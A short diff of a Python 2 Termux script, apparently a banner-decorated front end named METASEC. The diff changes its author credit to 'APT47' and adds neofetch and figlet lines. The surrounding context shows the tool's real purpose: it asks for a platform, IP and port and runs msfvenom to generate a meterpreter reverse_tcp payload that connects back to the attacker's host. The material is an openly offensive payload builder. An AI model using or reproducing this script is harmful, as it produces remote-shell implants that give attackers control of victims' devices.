@@ -20,8 +20,12 @@ os.system ("figlet -f mono12 METASEC | lolcat -a")
 time.sleep(3)
 os.system ("clear")
 os.system ("figlet PAYLOAD | lolcat")
+os.system ("neofetch --logo")
+os.system ("neofetch --ascii_distro Windows10 --logo")
+os.system ("cat /data/data/com.termux/files/home/METASEC/python.txt | lolcat")
+os.system ("figlet -f slant PHP | lolcat")
 print
-print " BY : DEFALT "
+print " BY : APT47 "
 print
 la = raw_input ("android/python/php/windows : ")
 ip = raw_input ("IP : ")
@@ -31,7 +35,7 @@ os.system ("msfvenom -p %s/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s" % (
 os.system ("clear")
 os.system ("figlet EXPLOIT | lolcat")
 print
-print " PROGRAM BY DEFALT "
+print " PROGRAM BY APT47 "
 print
 la = raw_input ("android/python/php/windows : ")
 ip = raw_input ("IP : ")
